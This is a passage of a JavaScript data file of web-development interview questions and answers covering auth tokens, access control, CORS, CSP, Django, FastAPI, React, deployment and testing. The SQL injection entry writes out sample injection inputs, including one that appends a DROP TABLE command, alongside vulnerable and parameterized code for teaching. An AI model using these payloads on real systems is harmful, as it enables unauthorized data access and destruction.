PKCE is now REQUIRED for all OAuth clients per RFC 9700 — even confidential ones.`,
    keywords: ["OAuth", "PKCE", "authorization-code", "token"],
  },
  {
    id: 53, level: "middle", topic: "auth",
    q: "Where should you store the JWT in a browser app?",
    a: `THE OPTIONS — none are perfect:

1. localStorage / sessionStorage
   PROS: easy to access from JS, works with XHR/fetch Authorization header.
   CONS: vulnerable to XSS — any malicious script can read the token. Once stolen, the attacker has a valid session until expiry.

2. Memory (a JS variable / state)
   PROS: lost on tab close, no persistence = no XSS exfiltration after closing the page.
   CONS: lost on refresh — needs a way to re-auth (silent refresh via cookie).

3. HTTP-only cookie (Secure, SameSite=Lax)
   PROS: JS can't read it → XSS can't steal the token directly.
   CONS: vulnerable to CSRF (browser auto-attaches it on cross-site POSTs unless SameSite stops it). Need CSRF tokens or strict SameSite.

REAL-WORLD HYBRID (recommended):
• Refresh token in HttpOnly+Secure+SameSite=Strict cookie (long-lived, rotates).
• Access token in MEMORY (short-lived, ~5–15 min).
• On page load: silent /refresh call using the cookie → new access token in memory.
• Set CSRF defense on the refresh endpoint (since it's cookie-auth).

This makes XSS unable to steal the refresh token (HttpOnly), and lost access tokens expire quickly.`,
    keywords: ["JWT", "localStorage", "cookie", "XSS", "refresh"],
  },
  {
    id: 54, level: "middle", topic: "authz",
    q: "RBAC vs ABAC — when to use which?",
    a: `RBAC (Role-Based Access Control) — assign users ROLES, attach permissions to roles.
  user.role == "editor" and "post:edit" in editor.perms → allowed.

PROS: simple, intuitive ("admin can do X, viewer can do Y").
CONS: explosion. "editor in tenant A but viewer in tenant B" — you start adding scopes to roles.
WHEN: small/mid apps with stable role structures.

ABAC (Attribute-Based Access Control) — decide based on ATTRIBUTES of (user, resource, action, context).
  if user.team == post.team and post.status != "locked" and time < deadline:
      allowed

PROS: expressive. Can encode "owner can edit their own posts during business hours".
CONS: harder to reason about, audit, and debug.
WHEN: complex domains (multi-tenant SaaS, compliance-heavy industries).

POLICY-AS-CODE: tools like OPA (Open Policy Agent), Casbin, Cerbos let you write rules in Rego/etc., evaluate them outside your app code. Great for ABAC at scale.

REAL APPS often combine: RBAC for coarse roles ("admin/user/guest"), object-level ABAC for "is this user the owner of this object?"`,
    keywords: ["RBAC", "ABAC", "permissions", "OPA"],
  },
  {
    id: 55, level: "middle", topic: "cors",
    q: "Common CORS mistakes and how to debug them.",
    a: `MISTAKES:
1. Wildcard + credentials. Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true → browser rejects. Must echo the specific origin.

2. Forgetting Vary: Origin. If you set ACAO based on the request's Origin, set Vary: Origin too — otherwise CDNs cache one origin's response and serve it to others.

3. Setting CORS headers ONLY on success responses. 4xx/5xx also need them; otherwise the browser hides the real error and only shows "CORS error".

4. Relying on CORS for security. CORS is browser-side; an attacker with curl ignores it. Auth still has to gate sensitive endpoints.

5. Preflight only on the route, not on the OPTIONS handler. Some routers require explicit OPTIONS handlers.

6. Trying to "fix" CORS in the FRONTEND. You can't. The server must respond with proper headers.

DEBUGGING CHECKLIST:
• Open DevTools → Network → click the failing request → look at the Console message and the actual headers.
• Is there a preflight (OPTIONS) request? Does it return 2xx with the right headers?
• Does the server echo the EXACT origin string (not just the domain)?
• Are credentials (cookies / Authorization) involved? Then no wildcard, and ACAC=true on both preflight and main.

When all else fails: a dev proxy (vite proxy, webpack-dev-server proxy) lets the browser see same-origin during development.`,
    keywords: ["CORS", "preflight", "credentials", "Vary"],
  },
  {
    id: 56, level: "middle", topic: "security",
    q: "What is Content Security Policy (CSP)?",
    a: `CSP is an HTTP response header that tells the browser which sources of content are allowed for the page. Defense-in-depth against XSS.

EXAMPLE:
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    report-uri /csp-report;

DIRECTIVES YOU'LL SEE:
• default-src — fallback for everything.
• script-src — JS sources. 'self' = same origin. 'unsafe-inline' = allow <script>...</script> (DEFEATS CSP for XSS).
• style-src — CSS.
• img-src, font-src, media-src — assets.
• connect-src — XHR/fetch/WebSocket destinations.
• frame-ancestors — who can iframe you. 'none' replaces X-Frame-Options.
• report-uri / report-to — browser POSTs violations here.

NONCES & HASHES instead of unsafe-inline:
  script-src 'self' 'nonce-r4nd0m';
  <script nonce="r4nd0m">init()</script>

ROLLOUT TIP: deploy as Content-Security-Policy-Report-Only first, watch the violation reports, then enforce. CSP can break legitimate features (analytics scripts, embeds) easily.`,
    keywords: ["CSP", "XSS", "nonce", "report-uri"],
  },
  {
    id: 57, level: "middle", topic: "security",
    q: "What is SQL Injection? Show vulnerable and safe code.",
    a: `SQL injection — attacker controls part of a SQL statement by smuggling SQL through user input.

VULNERABLE (string concatenation):
  email = request.GET["email"]
  cursor.execute("SELECT * FROM users WHERE email = '" + email + "'")
  # attacker sends: ' OR '1'='1
  # query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'  → ALL ROWS

Worse: ' OR 1=1; DROP TABLE users; --

SAFE — parameterized queries (the database driver escapes for you):
  cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

The %s here is NOT Python string formatting — it's a parameter placeholder for the DB driver.

Django ORM: User.objects.filter(email=email) → safe.
SQLAlchemy: session.query(User).filter(User.email == email) → safe.
.raw("...", [params]) → safe IF you pass params separately, NOT if you f-string into the SQL.

NEVER:
  cursor.execute(f"SELECT ... WHERE id = {user_id}")            # ❌
  cursor.execute("SELECT ... WHERE id = " + str(user_id))       # ❌

ORM-USERS: still vulnerable if you use raw SQL or .extra(where=user_input). Search for these in code review.

DEFENSE IN DEPTH: least-privilege DB user (the app DB user can't DROP tables); WAF; query allowlist for the most exposed endpoints.`,
    keywords: ["SQLi", "injection", "parameterized", "ORM"],
  },
  {
    id: 58, level: "middle", topic: "django",
    q: "select_related vs prefetch_related — when do you use each?",
    a: `Both solve the N+1 query problem but they work very differently.

SELECT_RELATED — uses a SQL JOIN. For ForeignKey and OneToOne (one-to-one direction).

  # Without
  for post in Post.objects.all():        # 1 query
      print(post.author.name)            # +1 per post = N+1
  # With
  for post in Post.objects.select_related("author"):
      print(post.author.name)            # 1 query total, JOINed

Generates: SELECT post.*, author.* FROM post JOIN author ON ...

PREFETCH_RELATED — runs a SECOND query and joins in Python. For ManyToMany and reverse ForeignKey.

  for post in Post.objects.prefetch_related("comments"):
      for c in post.comments.all():     # 2 queries total
          print(c.text)

Generates: SELECT * FROM post; then SELECT * FROM comment WHERE post_id IN (...).

DECISION:
• Forward FK or O2O → select_related (one JOIN).
• Reverse FK or M2M → prefetch_related (second query).
• Combining: Post.objects.select_related("author").prefetch_related("comments__user")

GOTCHA: ordering on the related queryset → use Prefetch() with a custom queryset:
  Prefetch("comments", queryset=Comment.objects.order_by("-created"))`,
    keywords: ["select_related", "prefetch_related", "N+1", "Django", "ORM"],
  },
  {
    id: 59, level: "middle", topic: "django",
    q: "What are Django signals? When should you NOT use them?",
    a: `Signals are Django's pub-sub system: code can subscribe to events (post_save, pre_delete, request_started) and run side effects.

  from django.db.models.signals import post_save
  from django.dispatch import receiver

  @receiver(post_save, sender=User)
  def create_profile(sender, instance, created, **kwargs):
      if created:
          Profile.objects.create(user=instance)

WHEN NOT TO USE THEM:
• When the side effect is BUSINESS LOGIC. Signals turn explicit code paths into invisible, action-at-a-distance behavior. New devs miss them and break things.
• When you need transactions. Signals fire during the save; if your handler does I/O and the outer transaction rolls back, you have a half-done side effect.
• When ordering matters — signal handler order is undefined.
• When testing — handlers fire in tests too, often unexpectedly. You end up adding @disable_signals decorators everywhere.

PREFER:
• An explicit method on the model (User.create_with_profile(...)).
• A service-layer function (signup(user_data)) that orchestrates.
• post_commit hooks via transaction.on_commit() for "after this transaction succeeds, do X".

GOOD USES:
• Decoupled cross-app reactions you can't put in the originating app.
• Cache invalidation hooks.
• Audit trail.

If you find yourself debugging "where is this row being modified??" — signals are usually the answer, and that's the warning.`,
    keywords: ["signals", "post_save", "Django", "decoupling"],
  },
  {
    id: 60, level: "middle", topic: "fastapi",
    q: "When should an endpoint be async def vs def in FastAPI?",
    a: `FastAPI runs both, but with different performance behavior.

ASYNC DEF — the function runs on the event loop. The whole request processing yields between awaits, so other requests get served on the same worker.
  Use when ALL I/O is awaitable: httpx.AsyncClient, asyncpg, aioredis, motor, etc.
  @app.get("/items")
  async def list_items():
      async with httpx.AsyncClient() as c:
          r = await c.get("https://api/...")
          return r.json()

DEF (sync) — FastAPI runs it in a THREADPOOL so it doesn't block the event loop.
  Use when you have BLOCKING I/O: psycopg2, requests, blocking SDKs, CPU-bound work.
  @app.get("/items")
  def list_items():
      r = requests.get("https://api/...")  # blocking is fine — runs in threadpool
      return r.json()

THE TRAP:
  @app.get("/items")
  async def list_items():
      r = requests.get("https://api/...")  # ❌ BLOCKS THE EVENT LOOP
      # → entire worker freezes for the duration of this call

Either go fully async (use httpx) or make the function plain def.

CPU-bound work: even def doesn't help if you're crunching for 5 seconds — you're hogging a thread. Push to a worker queue (Celery, RQ).`,
    keywords: ["async", "FastAPI", "event-loop", "threadpool"],
  },
  {
    id: 61, level: "middle", topic: "fastapi",
    q: "How do background tasks work in FastAPI?",
    a: `BackgroundTasks — fire-and-forget work that runs AFTER the response is sent.

  from fastapi import BackgroundTasks

  def send_email(to: str, subj: str):
      ...

  @app.post("/signup")
  def signup(user: UserIn, bg: BackgroundTasks):
      db.add(user); db.commit()
      bg.add_task(send_email, user.email, "Welcome")
      return {"status": "ok"}

The task runs IN THE SAME PROCESS, after the response is flushed. Good for short, low-criticality work (analytics ping, quick email).

LIMITATIONS — DO NOT USE for critical work:
• If the worker is killed (deploy, OOM), the task is LOST.
• No retries.
• No persistence across restarts.
• Slows the worker — it's blocked from serving until the task finishes.

PRODUCTION REPLACEMENT:
• Push to a queue (Redis/RabbitMQ/Kafka/SQS) inside the handler.
• A separate worker process (Celery, RQ, Arq, Dramatiq) consumes and runs.
• The worker has its own scaling, retries, DLQ.

RULE OF THUMB: BackgroundTasks for "best effort, < 100ms"; real broker for "must complete or be retried".`,
    keywords: ["BackgroundTasks", "FastAPI", "queue", "Celery"],
  },
  {
    id: 62, level: "middle", topic: "react",
    q: "useEffect — common pitfalls and the dependency array.",
    a: `useEffect runs AFTER render. Its deps array tells React when to re-run.

  useEffect(() => {
    document.title = \`Hello \${name}\`;
  }, [name]);  // re-runs only when name changes

THREE FORMS:
• [deps] → run on mount + whenever a dep changes.
• [] → run ONCE on mount.
• (no array) → run after EVERY render. Almost always wrong.

PITFALLS:
1. STALE CLOSURE. A function inside useEffect captures the values of state/props at THAT render. If you forget the dep, you keep using stale values.

2. INFINITE LOOPS. setState inside useEffect that triggers a re-render that triggers the effect.

3. OBJECT/ARRAY LITERAL DEPS. { foo: 1 } is a NEW object every render, so a [obj] dep makes effect re-run every render. Either lift the object out, or wrap in useMemo.

4. RACE CONDITIONS in fetch. If you setState after fetch but the user moved on:
     useEffect(() => {
       let active = true;
       fetch(url).then(d => { if (active) setData(d); });
       return () => { active = false; };  // cleanup
     }, [url]);

5. CLEANUP. Return a function from useEffect to undo subscriptions, timers, listeners.

NEW IN MODERN REACT: prefer useSyncExternalStore for external stores; data fetching → use a library (TanStack Query, SWR), not raw useEffect.`,
    keywords: ["useEffect", "deps", "stale-closure", "cleanup"],
  },
  {
    id: 63, level: "middle", topic: "react",
    q: "Controlled vs uncontrolled components.",
    a: `CONTROLLED — React state is the source of truth. Each keystroke updates state, which updates the input's value.

  const [name, setName] = useState("");
  return <input value={name} onChange={e => setName(e.target.value)} />;

PROS: full control over value (validate on input, format, disable submit, undo). Easy to test. Easy to reset.
CONS: re-renders on every keystroke. For huge forms, this can be slow if not careful.

UNCONTROLLED — DOM is the source of truth. You read the value via ref when you need it.

  const ref = useRef();
  const submit = () => console.log(ref.current.value);
  return <input ref={ref} defaultValue="" />;

PROS: cheap (no re-render per keystroke). Plays nice with non-React libraries.
CONS: can't react to value as the user types.

REAL-WORLD: most form libraries (React Hook Form) use UNCONTROLLED inputs internally for speed and only validate on submit/blur — you get the best of both.

FILE INPUTS are inherently uncontrolled (you can't programmatically set <input type="file">).`,
    keywords: ["controlled", "uncontrolled", "ref", "form"],
  },
  {
    id: 64, level: "middle", topic: "vue",
    q: "Composition API vs Options API — what changed?",
    a: `OPTIONS API (Vue 2 style) — components defined as a big object with sections:
  export default {
    data() { return { count: 0 } },
    computed: { double() { return this.count * 2 } },
    methods: { inc() { this.count++ } },
    mounted() { ... },
  }

PROS: easy onboarding, structure is enforced.
CONS: in big components, related logic is split across data / computed / methods. Reuse via mixins is messy.

COMPOSITION API (Vue 3) — components defined as a setup function (or <script setup>) that uses ref/reactive/computed/etc.:
  <script setup>
  import { ref, computed, onMounted } from 'vue';
  const count = ref(0);
  const double = computed(() => count.value * 2);
  function inc() { count.value++ }
  onMounted(() => { ... });
  </script>

PROS:
• Related logic (state + computed + handlers) lives together.
• Reuse via plain composables: useFoo(), useBar() → like React hooks.
• Better TypeScript support.
• Tree-shakable.

Both still work in Vue 3. Composition API is recommended for new code. <script setup> is the most ergonomic form.`,
    keywords: ["Vue", "composition", "options", "ref", "setup"],
  },
  {
    id: 65, level: "middle", topic: "perf",
    q: "What is the critical rendering path?",
    a: `The CRITICAL RENDERING PATH is the sequence of steps the browser takes from receiving HTML to painting pixels.

1. PARSE HTML → DOM tree.
2. PARSE CSS → CSSOM tree.
3. JS execution may modify both. <script> blocks parsing unless async/defer.
4. RENDER TREE = DOM × CSSOM (only visible nodes).
5. LAYOUT (reflow) — compute geometry (where each box is, how big).
6. PAINT — fill in pixels (colors, text, images).
7. COMPOSITE — combine layers (transforms, opacity).

WHAT BLOCKS:
• External CSS in <head> blocks render until loaded (CSS is render-blocking).
• <script> without async/defer blocks parsing.
• Solution: defer non-critical CSS (rel="preload" + onload swap), use defer or type="module" for scripts.

WHAT TRIGGERS REFLOW (expensive):
• Adding/removing DOM nodes.
• Changing geometry properties (width, height, font-size, padding).
• Reading computed style after a write (forced synchronous layout).

WHAT'S CHEAP (only paint or composite):
• transform, opacity, filter — handled by the compositor on the GPU.
• Hence "use transform: translate, not top/left" for animations.

CORE WEB VITALS measure this:
• LCP (Largest Contentful Paint) — main content visible.
• INP (Interaction to Next Paint) — input responsiveness.
• CLS (Cumulative Layout Shift) — visual stability.`,
    keywords: ["rendering", "reflow", "paint", "LCP", "vitals"],
  },
  {
    id: 66, level: "middle", topic: "realtime",
    q: "WebSocket vs Server-Sent Events vs Long Polling.",
    a: `LONG POLLING — client makes an HTTP request; server holds it open until data, then responds. Client immediately re-requests.
  PROS: works everywhere, plain HTTP.
  CONS: latency, lots of open connections, awkward.

SERVER-SENT EVENTS (SSE) — one-way persistent HTTP connection from server to client. text/event-stream content type. Browser EventSource API auto-reconnects.
  PROS: simple, HTTP-based (works with proxies, CDNs), built-in reconnection, scales well.
  CONS: ONE-WAY (server → client). Limited to ~6 connections per origin in HTTP/1.1 (HTTP/2 fixes this).
  USE: stock tickers, log streams, notifications, AI streaming responses.

WEBSOCKETS — full-duplex bidirectional connection over TCP, upgraded from HTTP via 101 Switching Protocols. Custom protocol on top.
  PROS: bidirectional, low overhead per message after handshake.
  CONS: more complex (auth, scaling sticky sessions or pub/sub backplane like Redis), harder to cache, often blocked by corporate proxies.
  USE: chat, collaborative editing, multiplayer games.

DECISION:
• Server pushes to client only → SSE.
• Both directions → WebSocket.
• Stuck on legacy infra → long polling.
• Don't use WebSocket as a hammer. SSE is enough for ~80% of "live updates" use cases and much easier to operate.`,
    keywords: ["websocket", "SSE", "long-polling", "realtime"],
  },

  // ============================================================
  // ============== SENIOR ==============
  // ============================================================
  {
    id: 80, level: "senior", topic: "auth",
    q: "Design a refresh token rotation scheme.",
    a: `GOAL: short-lived access tokens (security) + long-lived refresh tokens (UX, no constant re-login) + detection of token theft.

DESIGN:
• Access token: 5–15 min, stateless JWT, signed with RS256 (rotate keys via JWKS).
• Refresh token: opaque random string (NOT a JWT), 7–30 days, stored server-side. SET-COOKIE: HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh.

ROTATION ON USE:
1. Client calls POST /auth/refresh with the refresh-token cookie.
2. Server looks up the refresh token in the DB.
3. Server issues a NEW access token AND a NEW refresh token.
4. Server marks the OLD refresh token as USED.
5. New refresh token replaces cookie.

REUSE DETECTION:
• If the OLD (used) refresh token is presented again → it must have been stolen.
• Server invalidates the ENTIRE FAMILY (all tokens descended from this user's session) and forces re-login.
• Alert / log security event.

EXTRA HARDENING:
• Bind the refresh token to a device fingerprint (User-Agent hash + ASN), reject mismatches.
• Cap concurrent active refresh tokens per user.
• Add absolute lifetime (e.g., 30 days max regardless of rotation).
• Log out endpoint must REVOKE the refresh token in DB, not just clear the cookie.

WHY THIS WORKS: even if XSS exfiltrates an access token, it expires in minutes. The HttpOnly refresh cookie can't be stolen by XSS. If somehow the refresh leaks, the rotation chain detects double-use.`,
    keywords: ["refresh", "rotation", "token", "auth", "session"],
  },
  {
    id: 81, level: "senior", topic: "security",
    q: "How do you securely store passwords?",
    a: `NEVER store plaintext. Never use SHA-256 / MD5 alone — they're too fast for brute force.

USE A PASSWORD HASHING FUNCTION designed for the task:
• Argon2id (modern recommendation; OWASP top pick).
• bcrypt (battle-tested, work-factor tunable, cost ~12+ in 2026).
• scrypt (memory-hard).

These are SLOW BY DESIGN (~100ms per hash) so brute force is impractical.

HASH PROPERTIES:
• Per-user random SALT (already built into bcrypt/argon2 output).
• Optional PEPPER (a server-side secret added before hashing) stored outside the DB. Doesn't help if the whole machine is compromised but stops simple DB-only leaks.
• Tunable cost factor (work parameter) — increase as hardware gets faster.

CODE (Python):
  from argon2 import PasswordHasher
  ph = PasswordHasher()
  hash = ph.hash(password)
  ph.verify(hash, candidate)   # raises if wrong

ROTATION: when a user logs in, if their hash uses an outdated cost or algorithm, RE-HASH and update the DB.

OTHER RULES:
• Don't enforce stupid composition rules (require 1 special char) — encourage long passphrases and a password manager.
• NIST 2017+ recommends: minimum length 8, no expiry policy, check against known-breached lists (haveibeenpwned).
• Rate-limit login attempts; lock or slow after failures.
• MFA — TOTP (RFC 6238) or WebAuthn (passkeys) is gold standard now.`,
    keywords: ["bcrypt", "argon2", "password", "salt", "MFA"],
  },
  {
    id: 82, level: "senior", topic: "security",
    q: "OWASP Top 10 — name the categories you remember and one fix each.",
    a: `OWASP Top 10 (2021 categories):

A01 BROKEN ACCESS CONTROL — IDOR, missing role checks. Fix: deny by default; check ownership (user.id == resource.owner_id) in addition to authentication.

A02 CRYPTOGRAPHIC FAILURES — plaintext passwords, weak ciphers, no TLS. Fix: TLS everywhere, argon2id for passwords, AES-GCM for at-rest encryption.

A03 INJECTION — SQLi, command injection, LDAP injection, XSS. Fix: parameterized queries, ORM, output encoding, input validation.

A04 INSECURE DESIGN — missing rate limits, no MFA, no audit logs. Fix: threat modeling at design time, abuse cases.

A05 SECURITY MISCONFIGURATION — debug enabled in prod, default creds, exposed admin panels. Fix: secure defaults, infrastructure-as-code, scanners.

A06 VULNERABLE & OUTDATED COMPONENTS — old log4j, old Django. Fix: SCA tools (Dependabot, Snyk), update policy.

A07 IDENTIFICATION & AUTHENTICATION FAILURES — weak passwords, no MFA, session fixation. Fix: secure session IDs, MFA, password policies.

A08 SOFTWARE & DATA INTEGRITY FAILURES — auto-update from untrusted sources, no signing. Fix: signed packages, SBOMs, dependency pinning.

A09 LOGGING & MONITORING FAILURES — silent breaches. Fix: structured logs, alerts on auth failures, central SIEM.

A10 SSRF (Server-Side Request Forgery) — backend fetches a URL the user controls → attacker pivots into internal services. Fix: deny private IP ranges, allowlist destinations, separate egress proxy.`,
    keywords: ["OWASP", "top-10", "IDOR", "SSRF", "injection"],
  },
  {
    id: 83, level: "senior", topic: "django",
    q: "How does atomic() interact with on_commit() and post_save signals?",
    a: `transaction.atomic() opens a DB transaction. Code inside either commits as a unit or rolls back together.

SIGNALS (post_save) fire INSIDE the atomic block, BEFORE the transaction commits.
on_commit(callback) defers a callback until AFTER the OUTER transaction commits successfully.

CONSEQUENCES:
1. If your post_save handler enqueues a Celery task:
     @receiver(post_save, sender=Order)
     def notify(sender, instance, **kwargs):
         send_email.delay(instance.id)        # ← runs INSIDE transaction

   The Celery task may pick up Order.id and query the DB BEFORE the row is committed → "DoesNotExist" error.
   FIX:
     @receiver(post_save, sender=Order)
     def notify(sender, instance, **kwargs):
         transaction.on_commit(lambda: send_email.delay(instance.id))

2. NESTED atomic — Django uses SAVEPOINTS. Inner block rollback doesn't kill the outer transaction. on_commit still fires only after the OUTERMOST commit.

3. After an exception inside atomic, the connection is in a "broken" state until the block exits. Trying to query inside an except block raises TransactionManagementError. Use try/except OUTSIDE the atomic block.

REAL-WORLD RULE: any side effect that depends on committed data (email, queue, cache invalidation, webhook) MUST go through transaction.on_commit. Otherwise you ship "this works in tests but not in prod" bugs.`,
    keywords: ["atomic", "on_commit", "transaction", "Django", "signals"],
  },
  {
    id: 84, level: "senior", topic: "fastapi",
    q: "How would you structure a large FastAPI project?",
    a: `LAYERED, NOT FRAMEWORK-COUPLED. Avoid the "everything in main.py" trap.

  app/
    api/
      v1/
        __init__.py        # APIRouter
        users.py
        items.py
      deps.py              # FastAPI Depends() helpers
    core/
      config.py            # Pydantic BaseSettings
      security.py          # JWT, password hashing
      logging.py
    db/
      base.py              # SQLAlchemy Base
      session.py           # SessionLocal, engine
      models/              # ORM models
    schemas/               # Pydantic models for request/response
    services/              # business logic — calls repos, no FastAPI imports
    repositories/          # DB queries — no business logic
    main.py                # FastAPI() app, include_router, middleware
  alembic/
  tests/

PRINCIPLES:
• ROUTERS thin — parse params, call service, return.
• SERVICES own business logic. Take a DB session as an arg, not via global.
• REPOSITORIES isolate query syntax. Easy to swap to a different DB.
• PYDANTIC SCHEMAS are NOT the same as ORM models. Keep them separate.
• CONFIG via Pydantic BaseSettings + env vars (.env in dev, real env in prod).
• DEPENDENCIES — declare get_db, get_current_user once, reuse via Depends.

VERSIONING: APIRouter(prefix="/api/v1"). Don't break v1 — add v2 alongside.

TESTING: pytest + httpx.AsyncClient with app.dependency_overrides to mock DB / auth / external clients.

OBSERVABILITY: middleware that adds X-Request-ID, structured logs, OpenTelemetry traces.`,
    keywords: ["FastAPI", "structure", "layers", "router", "service"],
  },
  {
    id: 85, level: "senior", topic: "react",
    q: "When and how do you use React.memo, useMemo, useCallback?",
    a: `THESE ARE NOT FREE — they have their own cost (memoization storage + comparison). Use them when profiling shows a real problem.

REACT.MEMO — wraps a component; skips re-render if props are shallow-equal to previous.
  const Heavy = React.memo(function Heavy({ data }) { ... });

Useful when:
• Component is expensive to render AND
• Parent re-renders frequently AND
• Props don't actually change between those renders.

USEMEMO — caches the RESULT of a computation between renders.
  const sorted = useMemo(() => bigArray.sort(cmp), [bigArray]);

Useful when:
• Computation is genuinely expensive (sort, filter big lists).
• OR the result is passed as a prop to a memo'd child (so reference stability matters).

USECALLBACK — caches the FUNCTION between renders. Equivalent to useMemo(() => fn, deps).
  const onClick = useCallback(() => setCount(c => c+1), []);

Useful only when the function is passed to a memo'd child or used as a useEffect dep.

PITFALL: wrapping things in memo "just in case" hurts more than helps — every render runs deps comparisons and increases memory.

REACT 19+ — the React Compiler does this automatically. Many useMemo/useCallback go away.`,
    keywords: ["memo", "useMemo", "useCallback", "performance"],
  },
  {
    id: 86, level: "senior", topic: "perf",
    q: "What is code splitting and how do you implement it?",
    a: `CODE SPLITTING — break the bundle into multiple chunks loaded on demand. Smaller initial download → faster Time-to-Interactive.

ROUTE-LEVEL SPLIT — most impactful. Each page is its own chunk.

  // React Router
  import { lazy, Suspense } from "react";
  const Settings = lazy(() => import("./pages/Settings"));

  <Suspense fallback={<Spinner />}>
    <Settings />
  </Suspense>

The dynamic import() tells the bundler (Vite/Webpack/Rollup) to emit a separate chunk and fetch it when the route is visited.

COMPONENT-LEVEL SPLIT — for heavy widgets behind a click (date pickers, charts, modals).

LIBRARY SPLIT — heavy deps loaded only when needed.
  if (user.exporting) {
    const xlsx = await import("xlsx");
    xlsx.writeFile(...);
  }

WHAT TO MEASURE:
• Bundle Analyzer — what's actually big?
• Network panel — initial chunk size, time-to-interactive.
• Lighthouse / Core Web Vitals.

PITFALLS:
• Too many tiny chunks → request waterfall. Bundlers can hint with prefetch / preload.
• SSR / hydration interactions — make sure the lazy boundary plays nice with your framework (Next.js handles this; vanilla SPA with SSR needs care).

PRELOAD vs PREFETCH:
• <link rel="preload"> = "I need this for the current page, fetch with high priority".
• <link rel="prefetch"> = "I might need this for the next page, fetch when idle".`,
    keywords: ["code-splitting", "lazy", "Suspense", "bundle"],
  },
  {
    id: 87, level: "senior", topic: "deploy",
    q: "Walk through deploying a Django + React app to production.",
    a: `STACK (typical sane choice in 2026):
• Django + Gunicorn (WSGI) or uvicorn-worker for async views.
• React SPA built into static files (Vite build).
• PostgreSQL.
• Redis (cache + sessions + rate limiting).
• Reverse proxy: nginx or Caddy.
• Object storage (S3) for user uploads.
• Container: Docker; orchestration: ECS / Fly.io / Railway / k8s, depending on scale.

PIPELINE:
1. PR → CI runs lint, tests (pytest, vitest), type check (mypy, ts).
2. Merge to main → CI builds image, tags by git SHA, pushes to registry.
3. CD step deploys to staging, runs smoke tests.
4. Manual approval → prod rollout. Use BLUE/GREEN or rolling deploy.

DJANGO PROD CHECKLIST:
• DEBUG=False, ALLOWED_HOSTS set.
• SECRET_KEY from env (never in repo).
• Database via DATABASE_URL.
• Static via WhiteNoise or CDN; collectstatic in build.
• python manage.py migrate as a release task BEFORE traffic shifts.
• Logging: JSON to stdout; Sentry for errors.
• gunicorn workers ≈ 2 × CPU cores + 1; threads if you have I/O.
• HEALTH endpoint /healthz that doesn't hit the DB; /readyz that does.

REACT BUILD:
• vite build → dist/ with hashed asset names.
• Cache headers: HTML no-cache, assets immutable + 1 year.
• Inject runtime config via /env.json or window.__CONFIG__ (don't bake API URL into the bundle).

NETWORKING:
• HTTPS terminating at the proxy / load balancer.
• HSTS, security headers, CSP.
• /api/ → Django; everything else → React static.

DAY-2:
• Migrations strategy: backward-compatible (add column nullable, deploy code, backfill, make NOT NULL) so deploys don't lock tables.
• Backups + restore drills.
• Monitoring: Prometheus or vendor APM.`,
    keywords: ["deploy", "Django", "gunicorn", "nginx", "CI"],
  },
  {
    id: 88, level: "senior", topic: "perf",
    q: "How would you debug a slow page in production?",
    a: `Two angles to investigate: SERVER and CLIENT. Always measure first.

SERVER (TTFB high?):
1. Check application metrics — p50/p95/p99 latency by endpoint.
2. Look at DB:
   • Slow query log.
   • EXPLAIN ANALYZE the offenders. Missing index? N+1? sequential scan on a big table?
   • Connection pool exhausted?
3. External service calls — are you blocked on a 3rd-party API? Add timeouts and circuit breakers.
4. CPU profile a worker — flamegraph (py-spy, austin) shows hot paths.
5. GC pauses (rare in Python, common in Node).
6. Worker count too low for traffic → requests queue.

CLIENT (TTFB OK but page slow?):
1. DevTools → Network: huge bundle? Render-blocking resources? Slow CDN?
2. Performance tab: long tasks > 50ms, layout thrashing, expensive paints.
3. Lighthouse: LCP, INP, CLS scores + suggestions.
4. Bundle analyzer: any 1MB libraries you don't really need?
5. Re-render storm in React: enable Profiler, find components rendering 200×.

REAL USER MONITORING (RUM): your local DevTools is on a fast laptop. RUM tools (web-vitals.js + Sentry/DataDog) report from real users on real devices.

QUICK WINS:
• Add an index.
• Cache an expensive endpoint behind ETag or Redis.
• Defer a 3rd-party script.
• Code-split the heavy route.
• Move work to a background queue.`,
    keywords: ["performance", "TTFB", "EXPLAIN", "profiling", "Lighthouse"],
  },
  {
    id: 89, level: "senior", topic: "rest",
    q: "How do you version a public API?",
    a: `THREE COMMON STRATEGIES:

1. URI versioning — /v1/users, /v2/users.
   PROS: easy to reason about, easy to route in nginx, visible in logs.
   CONS: clients have to update URLs to upgrade.
   USE: most public APIs (Stripe, GitHub do this).

2. Header versioning — Accept: application/vnd.example.v2+json or X-API-Version: 2.
   PROS: URI is "the resource"; version is metadata.
   CONS: harder to test in a browser, harder for non-developer ops to inspect.

3. Query param — /users?api_version=2. Easiest to add ad-hoc but discouraged.

VERSIONING POLICY (regardless of mechanism):
• Backward-compatible changes (adding a field, adding an endpoint) DO NOT bump the version.
• Breaking changes (renaming a field, changing semantics) DO bump it.
• Deprecation: announce → 6+ months → sunset header → remove.
• Sunset header: Sunset: Sat, 31 Dec 2026 23:59:59 GMT.

PRACTICAL TIPS:
• Postel's law: be liberal in what you accept (ignore unknown fields), strict in what you send (don't add fields gratuitously).
• EVOLUTION over VERSIONING — most "v2" projects fail. Aim to evolve v1 with additive changes.
• Document explicitly: "we add fields without notice, we never remove them in the same version".`,
    keywords: ["versioning", "API", "REST", "Sunset", "deprecation"],
  },
  {
    id: 90, level: "senior", topic: "testing",
    q: "Unit / integration / e2e — what to test where?",
    a: `THE TEST PYRAMID (still useful):

UNIT — small, fast, no I/O. Test ONE function/class with the rest mocked.
  - Pure logic: validators, formatters, calculations.
  - 70%+ of your tests. Run on every save.

INTEGRATION — real DB, real cache, real queue. Mock external HTTP.
  - "Does this endpoint actually persist what it says?"
  - 20%-ish of your tests. Run on every push.
  - Use testcontainers / a Docker compose with throwaway services.

END-TO-END (e2e) — real browser, real network, real backend. Playwright / Cypress.
  - "Can a user sign up and place an order?"
  - 5-10 happy-path tests. Run on PR and nightly.
  - Slow, flaky if not done well. Don't try to test edge cases here — too brittle.

CONTRACT TESTS — between services, verify request/response shapes match (Pact).

WHAT NOT TO TEST:
• Don't test framework code (you don't need to test that Django saves a model).
• Don't test third-party libs.
• Don't snapshot test JSON responses verbatim — they break on every additive change.

TEST DATA: factories (factory_boy, FactoryBot) over fixtures. They're composable.

